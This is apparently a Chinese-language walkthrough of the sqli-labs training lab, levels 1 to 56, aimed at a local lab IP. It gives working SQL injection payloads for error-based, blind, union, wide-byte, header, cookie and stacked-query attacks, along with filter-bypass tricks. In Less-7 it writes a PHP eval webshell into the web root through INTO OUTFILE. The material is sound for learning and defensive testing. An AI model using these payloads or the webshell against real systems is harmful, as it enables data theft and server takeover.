# Sqli-labs

### Less-1：GET - Error based - Single quotes - string

**注入类型**

报错注入

**闭合方式**

id='\$id'

#### 判断中止类型

***

```sql
//回显正常
http://192.168.65.128/sqli-labs/Less-1/?id= 1' and 1=1 --+
//回显异常
http://192.168.65.128/sqli-labs/Less-1/?id= 1' and 1=2 --+

```

![](file/image_oKm-joLHvd.png)

![](file/image_8U0eltnyM8.png)

#### 使用报错注入

***

```sql
//爆数据库
and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

![](file/image_Db6YGqJ9sU.png)

```sql
//爆表名
and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1) --+ 
```

![](file/image_01mHpduoVe.png)

```sql
//爆字段名
and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e),1) --+ 
```

![](file/image_1an0K-pWhm.png)

```sql
//爆数据
and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users  ),0x7e),1) --+
```

![](file/image_OpPyTpY_L8.png)

### Less-2：GET - Error based - lntiger based

**注入类型**

报错注入

**闭合方式**

id=\$id

```sql
//爆数据库
and updatexml(1,concat(0x7e,database(),0x7e),1) 
```

![](file/image_i__odmIBIT.png)

### Less-3：GET -Error based - Single quotes with twist - string

**注入类型**

报错注入

**闭合方式**

id=('\$id')

```sql
//爆数据库
and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

![](file/image_Ne96n5MTKc.png)

### Less-4：GET - Error based - Double Quotes - string

**注入类型**

报错注入

**闭合方式**

id=("\$id")

```sql
and extractvalue(1,concat(0x7e,database())) --+
```

![](file/image_gcMfxIemlY.png)

### Less-5：GET - Double Query - single Quotes - string

**注入类型**

双查询注入→[floor() 报错注入](../学习/floor()%20报错注入/floor()%20报错注入.md 报错注入/floor() 报错注入.md> "floor() 报错注入")

**闭合方式**

id='\$id'

```sql
and (select 1 from (select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2)))a) --+
```

![](file/image_KUORHVI4Jc.png)

### Less-6：GET - Double lnjection - Double Quotes - string

**注入类型**

双查询注入

**闭合方式**

id="\$id"

```sql
and (select 1 from (select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2)))a) --+
```

![](file/image_HvXAHZl_zB.png)

### Less-7：GET - Dump into outfile - string

**注入类型**

文件操作→[数据库文件操作](../../学习/数据库文件操作/数据库文件操作.md "数据库文件操作")

**闭合方式**

id=(('\$id'))

```sql
//通过前面关卡爆出文件操作权限和文件操作相对路径
//发现操作目录，但是禁止操作
and updatexml(1,concat(0x7e,@@datadir,0x7e,@@secure_file_priv),1) --+

```

![](file/image_PK1SKE6CJQ.png)

先到服务器修改权限后，再查看权限，此时无限制

![](file/image_k6KII4FTuz.png)

![](file/image_JBM9B_rR-U.png)

```sql
//将结果显示到文本，虽然显示错误，但是生成文件成功
union select 1,database(),3 into outfile "C:\\phpStudy\\MySQL\\data\\dump.txt" --+
```

![](file/image_aeg_iV0Pvh.png)

```sql
http://192.168.65.128/sqli-labs/Less-1/?id=-1'
union select 1,(load_file("C:\\phpStudy\\MySQL\\data\\dump.txt")),3
```

![](file/image_p_eOrNNrKu.png)

```sql
//写入一句话木马，使用蚁剑连接
http://192.168.65.128/sqli-labs/Less-7/?id=-1')) 
union select 1,"<?php @eval($_POST['cmd']); ?>",3 into outfile "C:\\phpStudy\\www\\sqli-labs\\Less-7\\dump.php" --+  
```

![](file/image_9sRw4JUbx3.png)

![](file/image_af4WfBf8TU.png)

![](file/image_q0BXpFznn_.png)

### Less-8：GET - Blind - Boolian Based - single Quotes

**注入类型**

布尔盲注

**闭合方式**

id='\$id'

```sql
//判断数据库长度
http://192.168.65.128/sqli-labs/Less-8/?id=1'
and length(database())>=8 --+
http://192.168.65.128/sqli-labs/Less-8/?id=1'
and length(database())>=9 --+ 
```

![](file/image_nepIBUwFMH.png)

![](file/image_KVvrxA287m.png)

```sql
//爆数据库
 http://192.168.65.128/sqli-labs/Less-8/?id=1' 
 and substr(database(),1,1)='s' --+
```

![](file/image_YPS5R_iKnw.png)

使用bp快速爆破

![](file/image_dcQDKACA3R.png)

```sql
//爆表
 http://192.168.65.128/sqli-labs/Less-8/?id=1' 
 and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e' --+
```

![](file/image_ABB6clPiXI.png)

![](file/image__OZqK0wt2D.png)

```sql
//爆字段
http://192.168.65.128/sqli-labs/Less-8/?id=1' 
and substr((select column_name from information_schema.columns where table_schema='security' and table_name='users'  limit 0,1),1,1)='i' --+
```

![](file/image_F6xcBRMnAb.png)

![](file/image_x7RkBexdsV.png)

```sql
//爆数据
http://192.168.65.128/sqli-labs/Less-8/?id=1' 
and substr((select username from users limit 0,1),1,1)='i' --+ 
```

![](file/image_ALSCn6n_p3.png)

![](file/image_O43cP0y6XH.png)

### Less-9：GET - Blind - Time based. - Single Quotes

**注入类型**

时间盲注

**闭合方式**

id='\$id'

```sql
http://192.168.65.128/sqli-labs/Less-9/?id=1' 
and if(substr(database(),1,1)='s',sleep(5),1) --+
```

![](file/image_bC0MpfzVw3.png)

### Less-10：GET - Blind - Time based - double quotes

**注入类型**

时间盲注

**闭合方式**

id="\$id"

```sql
http://192.168.65.128/sqli-labs/less-10/?id=1" 
and if(substr(database(),1,1)='s',sleep(5),1) --+
```

![](file/image_JsP1ftZsXP.png)

### Less-11：POST - Error Based - Single quotes- string

**注入类型**

报错注入

**闭合方式**

id='\$id'

```sql
admin' and updatexml(1,concat(0x7e,database()),1) #
```

![](file/image_-rYeY_Nn7W.png)

### Less-12：POST -Error Based - Double quotes- string - with twist

**注入类型**

报错注入

**闭合方式**

id=("\$id")

```sql
admin") and updatexml(1,concat(0x7e,database()),1) #
```

![](file/image_GnccndMVWj.png)

### Less-13：POST - Double lnjection - Single quotes- String - with twist

**注入类型**

双查询注入

**闭合方式**

id=('\$id')

```sql
admin') 
union select 1,count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2))#
```

![](file/image_OMmccX7kxd.png)

### Less-14：POST -Double Injection- Double quotes- String

**注入类型**

双查询注入

**闭合方式**

id="\$id"

![](file/image_DftQRANZZA.png)

```sql
admin" 
and (select 1 from (select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2)))a ) #
```

![](file/image_XcZhXYmjnI.png)

### Less-15：POST - Blind-Boolian/time Based - Single quotes

**注入类型**

布尔盲注

**闭合方式**

id='\$id'

```sql
admin'
and substr(database(),1,1)='s' #
```

![](file/image_357BdYT-N9.png)

![](file/image_GLqBxB7Lm7.png)

### Less-16：POST - Blind-Boolian/Time Based - Double quotes

**注入类型**

布尔盲注

**闭合方式**

id=("\$id")

```sql
admin") 
and substr(database(),1,1)='s' #
```

![](file/image_YngTXf4QF0.png)

![](file/image_qfH_bMFQHF.png)

### Less-17：POST - Update Query- Error Based - string

**注入类型**

报错注入

**闭合方式**

id='\$id'

> 💡这一题对表`users`  和`uname`传参进行过滤，因此一定要知道账户名

-   这题的场景是重设密码界面，重设密码时用到了Update语句，因此通过密码输入处注入

```sql
admin'
and extractvalue(1,concat(0x7e,database())) #
```

![](file/image_A3l67os3vK.png)

```sql
//通过表users进行爆数据时被拒绝
admin' 
and extractvalue(1,concat(0x7e,(select username from users limit 0,1))) # 
```

![](file/image_Qji8gyUfP4.png)

```sql
//将 users 表用 select * from users 语句代替
admin' and extractvalue(1,concat(0x7e,(select username from (select * from users)a limit 0,1))) #
```

![](file/image_oiJoONio7e.png)

### Less-18：POST - Header Injection - Uagent field - Error based

**注入类型**

头部注入

**闭合方式**

id=('\$id')

> 💡这一题对uname和passwd都进行过滤，因此必须要知道一个账号密码

![|成功登陆后发现回显User-Agent字段](file/image_Px2roEC1Tw.png "|成功登陆后发现回显User-Agent字段")

![|分析源码发现HTTP字段User-Agent有注入点](file/image_-jlpKE3uL5.png "|分析源码发现HTTP字段User-Agent有注入点")

**PHP 里用来获取客户端 IP 的变量**

-   `$_SERVER['HTTP_CLIENT_IP']` 这个很少使用，不一定服务器都实现了。客户端可以伪造。
-   `$_SERVER['HTTP_X_FORWARDED_FOR']`，客户端可以伪造。
-   `$_SERVER['REMOTE_ADDR']`，客户端不能伪造。（本题就是使用这种方法）

```sql
//这里不能对IP进行伪造，只能伪造User-Agent
1' and updatexml(1,concat(0x7e,database()),1), 1, 1) # 
```

![](file/image_suvH-5e4WA.png)

![](file/image_eaTpKlkjFP.png)

### Less-19：POST -Header lnjection - Referer field - Error based

**注入类型**

头部注入

**闭合方式**

id=('\$id')

```sql
 //与18题类似，这题利用 referer 字段
 'and updatexml(1,concat(0x7e,database()),1))#
```

![](file/image_YKFlTnp5mf.png)

### Less-20：POST - Cookie injections - Uagent field - error based

**注入类型**

Cookie注入

**闭合方式**

id='\$id'

```sql
//正常登陆后，自动生成一个cookie
```

![](file/image_odHKxEaSey.png)

```sql
//修改cookie
admin' and  updatexml(1,concat(0x7e,database()),1)#
```

![](file/image_hKmgZ5Mhrt.png)

### Less-21：POST-cookie injection- base64 encoded-single quotes and parenthesis

**注入类型**

Cookie注入

**闭合方式**

id=('\$id')

```sql
//正常登陆后，自动生成cookie，但是发现值是加密过
```

![](file/image_0TTeM5IMg8.png)

```sql
//查看源码发现是使用 base64 加密
```

![](file/image_suhKbTDG39.png)

```sql
//将payload进行base64加密再注入到cookie
admin') and  updatexml(1,concat(0x7e,database()),1)#
//编码后
YWRtaW4nKSBhbmQgIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCkpLDEpIw==
```

![](file/image_WImaO3FXa4.png)

### Less-22：POST-Cookie lnjection - base64 encoded - double quotes

**注入类型**

cookie注入

**闭合方式**

id="\$id"

```sql
admin" and  updatexml(1,concat(0x7e,database()),1)#
//转换后
YWRtaW4iIGFuZCAgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSksMSkj
```

![](file/image_ZMCp-aPDgh.png)

### Less-23：GET - Error based - strip comments

**注入类型**

报错注入

**闭合方式**

id='\$id'

```sql
//分析源码发现这题对注释进行过滤
```

![](file/image_b8TPPTVXXk.png)

```sql
//因此这题采用闭合  '1'='1  与sql语句后面的  '  闭合的方式绕过
 http://192.168.65.128/sqli-labs/Less-23/?id=1' 
 and '1'='1 
```

![](file/image_5-KnfsGJp5.png)

```sql
http://192.168.65.128/sqli-labs/Less-23/?id=1' 
and updatexml(1,concat(0x7e,database()),1) and '1'='1
```

![](file/image_Zi4hwEDr0J.png)

### Less-24：POST- Second oder Injections Real treat - Stored lnjections

**注入类型**

二次注入

**闭合方式**

id='\$id'

|查看源码中修改密码的SQL语句

![](file/image_GYmxpGkAha.png)

```sql
//注册一个账户，名为admin'#
```

![](file/image_s1riWe5YEt.png)

```sql
//修改密码为123456
```

![](file/image_ZYNZsFSpxa.png)

```sql
//使用密码123456 登录admin成功
```

![](file/image_Vs1bBGRak2.png)

![|查看数据库中发现密码已改](file/image_eiLN5KiQuL.png "|查看数据库中发现密码已改")

### Less-25：GET - Error based - All your OR & AND belong to us -string single quote

**注入类型**

报错注入

**闭合方式**

id='\$id'

```sql
//通过双写and绕过过滤
http://192.168.65.128/sqli-labs/Less-25/?id=1' 
anandd 1=1 --+ 
```

![](file/image_WXLvc_08NN.png)

```sql
http://192.168.65.128/sqli-labs/Less-25/?id=1' 
anandd updatexml(1,concat(0x7e,database()),1) --+
```

![](file/image_h_PLFp4Kw9.png)

```sql
// inforrmation_schema 、 and 、 or 都需要双写
http://192.168.65.128/sqli-labs/Less-25/?id=1' 
anandd updatexml(1,concat(0x7e,(select group_concat(column_name) from infoorrmation_schema.columns where table_schema='security' anandd table_name='users')),1) --+
```

![](file/image_DoaeWgKGPv.png)

```sql
// password 中的 or 也要双写
http://192.168.65.128/sqli-labs/Less-25/
?id=1' anandd updatexml(1,concat(0x7e,(select concat(username,0x7e,passwoorrd) from users limit 0,1 )),1) --+
```

![](file/image_n-9oInMmWj.png)

### Less-25a：GET -Blind Based - All your OR & AND belong to us- Intiger based

**注入类型**

布尔盲注

**闭合方式**

id=\$id

>  25a和25的区别在于25a无回显，所以要用盲注

```sql
http://192.168.65.128/sqli-labs/Less-25a/?id=1 
anandd substr(database(),1,1)='s'
```

![](file/image_9PsDsjQ-95.png)

### Less-26：GET - Error based - All your SPACES and COMMENTS belong to us

**注入类型**

报错注入

**闭合方式**

id='\$id'

> 查看源码发现比起Less-25，过滤了空格和注释
> 这里绕过空格过滤的方法可以使用 **`()`** 代替空格，注释可以使用\*\*`and '1'='1`\*\* 去闭合sql语句后面的 **`'`**

![](file/image_VwStZFFlSP.png)

```sql
http://192.168.65.128/sqli-labs/Less-26/?id=1' 
anandd(updatexml(1,concat(0x7e,(select(database()))),1)) anandd '1'='1
```

![](file/image_1Qx_WaIxbo.png)

### Less-26a：GET -Blind Based - All your SPACES and COMMENTS belong to us -string-singlequotes-Parenthesis

**注入类型**

布尔盲注

**闭合方式**

id=('\$id')

```sql
//与Less-26对比，Less-26a删除了报错信息
http://192.168.65.128/sqli-labs/Less-26a/?id=1') 
aandnd (substr(database(),1,1)='s') || ('1'='1
```

![](file/image_bqqQQdm6xK.png)

### Less-27：GET - Error Based-All your UNION & SELECT Belong to us - String - single quote

**注入类型**

报错注入

**闭合方式**

id='\$id'

> 查看源码发现过滤了\*\*`union`**和**`select`\*\* ，并且 **`/m`** 表示一直检测，所以这里\*\*`select`\*\* 不能用双写绕过
> 这里可以采用大小写绕过，比如\*\*​`selecT`\*\*

![](file/image_lbk1uTP3C6.png)

```sql
http://192.168.65.128/sqli-labs/Less-27/?id=1'
and(updatexml(1,concat(0x7e,(selecT(group_concat(password))from(users))),1))||'1'='1
```

![](file/image_j_o5-YkLlp.png)

### Less-27a：GET - Blind Based-All your UNION & SELECT Belong to us - Double Quotes

**注入类型**

布尔盲注

**闭合方式**

id="\$id"

```sql
//与Less-27对比，Less-27a删除了报错信息
http://192.168.65.128/sqli-labs/Less-27a/?id=1"
and(substr(database(),1,1)='s')and"1"="1
```

![](file/image_MscvI_AVFA.png)

### Less-28：GET-Error Based- All your UNION & SELECT Belong to us - String -Single quote with parenthesis

**注入类型**

联合注入

**闭合方式**

id=('\$id')

> 💡题干说是报错注入，但查看源码发现删除了报错信息，因此这题不能使用报错注入

![](file/image_QRE9t0267T.png)

> 查看源码发现过滤了\*\*`union select`**组合，但是发现只过滤一次，因此把**`union select`\*\* 双写即可过滤
> **`%0A`** 用于代替空格

![](file/image_wqMKyXUjjq.png)

```sql
http://192.168.65.128/sqli-labs/Less-28/?id=100')
uniounion%0Aselectn%0Aselect%0A1,database(),3||('1')=('1
```

![](file/image_1bDGpb_-_3.png)

### Less-28a：GET -Blind Based-All your UNION & SELECT Belong to us -single quote-parenthesis

**注入类型**

布尔盲注

**闭合方式**

id=('\$id')

```sql
http://192.168.65.128/sqli-labs/Less-28a/?id=1')
and(substr(database(),1,1)='s')and('1')=('1
```

![](file/image_g64UWk8Lzs.png)

### Less-29：GET-Error based- IMPIDENCE MISMATCH-Having a WAF in front of web application

**注入类型**

报错注入

**闭合方式**

id=

```sql
```

> 🚫未安装tomcat环境

### Less-30：GET -BLIND - IMPIDENCE MISMATCH-Having a WAF in front of web application

**注入类型**

注入

**闭合方式**

id=

```sql
```

> 🚫未安装tomcat环境

### Less-31：GET -BLIND - IMPIDENCE MISMATCH-Having a WAF in front of web application

**注入类型**

注入

**闭合方式**

id=

```sql
```

> 🚫未安装tomcat环境

### Less-32：GET - Bypass custom filter adding slashes to dangerous chars

**注入类型**

注入

**闭合方式**

id=

```sql
```

> 🚫未安装tomcat环境

### Less-33：GET - Bypass Addslashes()

**注入类型**

宽字节注入

**闭合方式**

id='\$id'

> 查看源码发现对特殊符号进行转义
> **`addslashes()`** 方法将字符串中的 **`'`**、*`"`*、**`\`** 等进行转义成 **`\'`**、**`\"`**、**`\\`**

![](file/image_8TkVohEdi7.png)

```sql
http://192.168.65.128/sqli-labs/Less-33/?id=1'
```

![](file/image_N60H5WasED.png)

```sql
//因为对 ' 进行转义后，sql语句中的 ' 也会被转义，因此采用一句话方法直接爆破
http://192.168.65.128/sqli-labs/Less-33/?id=-1%df' 
union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database()and table_name=(select table_name from information_schema.tables where table_schema=database() limit 1,1 )),3--+
```

![](file/image_VYOKDz38W9.png)

### Less-34：POST - Bypass Addslashes()

**注入类型**

宽字节注入

**闭合方式**

id=

```sql
//POST型中对于参数的特殊符号是会先编码再传输的所以不能直接使用 %df 
uname=%df' or 1=1 #
```

![](file/image_rWFlmPNilX.png)

> 通过抓包发现会将\*\*`%df`**的**`%`\*\* 编码成\*\*​`%25`\*\* ，因此\*\*​`%df`\*\* 变成 **`%25df`** ，所以出错

![](file/image_Z-NjB0rvip.png)

> //因此我们之间在Bp里面修改\*\*`uname`\*\*就可以避免编码问题

![](file/image_w4ajO06a3U.png)

```sql
uname=%df' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database()and table_name=(select table_name from information_schema.tables where table_schema=database() limit 1,1 ))#
```

![](file/image_OGihRmZACc.png)

### Less-35：GET - Bypass Add slashes (we dont need them) lnteger based

**注入类型**

联合注入

**闭合方式**

id=\$id

```sql
//因为闭合是整型的就用不上宽字节，但是sql语句里面的 ' 还是会被转义，所以用一句话爆字段
http://192.168.65.128/sqli-labs/Less-35/?id=-1 
union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3
```

![](file/image_281K1UaXGY.png)

### Less-36：GET - Bypass MysQL\_real\_escape\_string

**注入类型**

宽字节注入

**闭合方式**

id='\$id'

> \*\*`mysql_real_escape_string`**与**`addslashes`**的区别在于作用角色不同，并且**`mysql_real_escape_string`\*\*是MySql中的函数

```sql
http://192.168.65.128/sqli-labs/Less-36/?id=-1%df' 
union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23
```

![](file/image_fFQRDuwtZQ.png)

### Less-37：POST-Bypass MySQL\_real\_escape\_string

**注入类型**

宽字节注入

**闭合方式**

id='\$id'

```sql
uname=1%df' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database()and table_name=(select table_name from information_schema.tables where table_schema=database() limit 1,1 ))#
```

![](file/image_f9jHh_PbGn.png)

### Less-38：Future Editions

**注入类型**

堆叠注入

**闭合方式**

id='\$id'

> 源码中使用了\*\*`mysqli_multi_query()`\*\* 执行sql语句，所以可以同时执行多条sql语句（用\*\*​`;`**分开），但是只有第一句sql语句会有回显，所以这里使用写入文件，也可以使用**`update`\*\*等函数

```sql
http://192.168.65.128/sqli-labs/Less-38/?id=1';
select 1,database(),3 into outfile "C:\\phpStudy\\MySQL\\data\\dump.txt" --+
```

![](file/image_QSQ11ssoOc.png)

![](file/image_GXclkIFgtP.png)

### Less-39：GET - stacked Query lnjection - lntiger based

**注入类型**

堆叠注入

**闭合方式**

id=\$id

```sql
http://192.168.65.128/sqli-labs/Less-39/?id=1;
select 'Less-39',database(),3 into outfile "C:\\phpStudy\\MySQL\\data\\dump.txt" --+
```

![](file/image_1kq0nMAc1F.png)

![](file/image_dc3xJOGOlm.png)

### Less-40：GET - BLIND based - string - Stacked

**注入类型**

堆叠注入

**闭合方式**

id=('\$id')

```sql
http://192.168.65.128/sqli-labs/Less-40/?id=1');
select 'Less-40',database(),3 into outfile "C:\\phpStudy\\MySQL\\data\\dump.txt" --+
```

![](file/image_SJWKR9tcx4.png)

![](file/image_shNyjk-qs9.png)

### Less-41：GET -BLIND based - lntiger - stacked

**注入类型**

堆叠注入

**闭合方式**

id=%id

```sql
http://192.168.65.128/sqli-labs/Less-41/?id=1;
select 'Less-41',database(),3 into outfile "C:\\phpStudy\\MySQL\\data\\dump.txt" --+
```

![](file/image_HD7of1Rtqk.png)

![](file/image_D-rS35Jsm5.png)

### Less-42：POST - Error based - string - stacked

**注入类型**

堆叠注入

**闭合方式**

id='\$id'

```sql
//密码框处存在堆叠注入
password=admin';select 'Less-42',database(),3 into outfile "C:\\phpStudy\\MySQL\\data\\dump.txt" #
```

![](file/image_krY6wkIFng.png)

![](file/image_RFkJjzzXxv.png)

### Less-43：POST - Error based - string - Stacked with twist

**注入类型**

堆叠注入

**闭合方式**

id=('\$id')

```sql
password=admin');select 'Less-43',database(),3 into outfile "C:\\phpStudy\\MySQL\\data\\dump.txt" #
```

![](file/image_uEsppPUl0Y.png)

![](file/image_I5lfDcd78v.png)

### Less-44：POST - Stacked Query Blind

**注入类型**

堆叠注入

**闭合方式**

id='id'

```sql
password=admin';select 'Less-44',database(),3 into outfile "C:\\phpStudy\\MySQL\\data\\dump.txt" #
```

![](file/image_8l1Vmxhn5J.png)

![](file/image_48MT1XsoKm.png)

### Less-45：POST - Stacked Query Blind based twist

**注入类型**

堆叠注入

**闭合方式**

id=('\$id')

```sql
password=admin');select 'Less-45',database(),3 into outfile "C:\\phpStudy\\MySQL\\data\\dump.txt" #
```

![](file/image_9Dg0V-BdDn.png)

![](file/image_UWsjU2SJGI.png)

### Less-46：GET -Error based - Numeric - ORDER BY CLAUSE

**注入类型**

报错注入

**闭合方式**

id=\$id

```sql
http://192.168.65.128/sqli-labs/Less-46/?sort=1 
and updatexml(1,concat(0x7e,database()),1)
```

![](file/image_IRAPn3l1oF.png)

### Less-47：GET - Error based - string - ORDER BY CLAUSE

**注入类型**

报错注入

**闭合方式**

id='\$id'

```sql
http://192.168.65.128/sqli-labs/Less-47/?sort=1' 
and updatexml(1,concat(0x7e,database()),1) --+
```

![](file/image_1e2EsAWMmx.png)

### Less-48：GET - Error based - Blind-Numeric- ORDER BY CLAUSE

**注入类型**

布尔盲注

**闭合方式**

id=\$id

```sql
//利用rand(true)与rand(false)结果不同，实现盲注两种状态
http://192.168.65.128/sqli-labs/Less-48/?sort=
rand(left(database(),1)='s')
```

![](file/image_2fQ8aysXSC.png)

![](file/image_gHLbVNoJs1.png)

### Less-49：GET - Error based - string- Blind - ORDER BY CLAUSE

**注入类型**

时间盲注

**闭合方式**

id='\$id'

```sql
http://192.168.65.128/sqli-labs/Less-49/?sort=1' 
and if(substr(database(),1,1)='a',sleep(1),1) --+
```

![](file/image_9-rIxs7qhJ.png)

![](file/image_zK1iZXQLah.png)

### Less-50：GET -Error based - ORDER BY CLAUSE -numeric- stacked injection

**注入类型**

堆叠注入

**闭合方式**

id=\$id

```sql
http://192.168.65.128/sqli-labs/Less-50/?sort=2;
select 'Less-50',database() into outfile "C:\\phpStudy\\MySQL\\data\\dump.txt";
```

![](file/image_tQSEnNnztO.png)

![](file/image_vvKOxaRTO6.png)

### Less-51：GET -Error based - ORDER BY CLAUSE-String- stacked lnjection

**注入类型**

堆叠注入

**闭合方式**

id='\$id'

```sql
http://192.168.65.128/sqli-labs/Less-51/?sort=2';
select 'Less-51',database() into outfile "C:\\phpStudy\\MySQL\\data\\dump.txt"; --+
```

![](file/image_sbdrnuAkj9.png)

![](file/image_aTHf1JxxkD.png)

### Less-52：GET -Blind based - ORDER BY CLAuSE-numeric- stacked injection

**注入类型**

堆叠注入

**闭合方式**

id=\$id

```sql
http://192.168.80.128/sqli-labs/Less-52/?sort=1;
select 'Less-52',database() into outfile "C:\\phpStudy\\MySQL\\data\\dump.txt";
```

![](file/image_9HMYvoSrnP.png)

![](file/image_Cb3b6OjVE6.png)

### Less-53：GET -Blind based - ORDER BY CLAUSE -String- stacked injection

**注入类型**

堆叠注入

**闭合方式**

id='\$id'

```sql
http://192.168.80.132/sqli-labs/Less-53/?sort=2';
select 'Less-53',database() into outfile "C:\\phpStudy\\MySQL\\data\\dump.txt"; --+
```

![](file/image_W6uGhI9WhO.png)

![](file/image_OBRkiG_F69.png)

### Less-54：GET - challenge - Union- 10 queries allowed - variation l

**注入类型**

联合注入

**闭合方式**

id='\$id'

> challenge 题目未注入加入了次数限制，在尝试一定次数（这题为10次）后，数据库中的表名和字段都会发生改变

```sql
http://192.168.80.132/sqli-labs/Less-54/?id=-1'  
union select 1,(select secret_5ANF from 23i0nc1py0 limit 0,1),3--+
```

![](file/image_v_GmK7rvY6.png)

### Less-55：GET - challenge - Union- l4 queries allowed - Variation 2

**注入类型**

联合注入

**闭合方式**

id=(\$id)

![](file/image_6PHJGuSl0x.png)

```sql
http://192.168.80.132/sqli-labs/Less-55/?id=-1)  
union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 --+
```

![](file/image_s_tzdnOSHa.png)

```bash
http://192.168.80.132/sqli-labs/Less-55/?id=-1)  
union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='hldw3868xt'),3 --+
```

![](file/image_qqTGCQcCBu.png)

```bash
http://192.168.80.132/sqli-labs/Less-55/?id=-1)  
union select 1,(select group_concat(secret_3ZNN) from hldw3868xt ),3 --+
```

![](file/image_kvljM-4AyP.png)

### Less-56：GET - challenge - Union- l 4 queries allowed - variation 3

**注入类型**

联合注入

**闭合方式**

id=('\$id')

```sql
http://192.168.80.132/sqli-labs/Less-56/?id=-1') 
union select 1,(select group_concat(secret_97J5) from 1x10v2xxfh),3 --+
```

![](file/image_e7Pjfuwtr2.png)
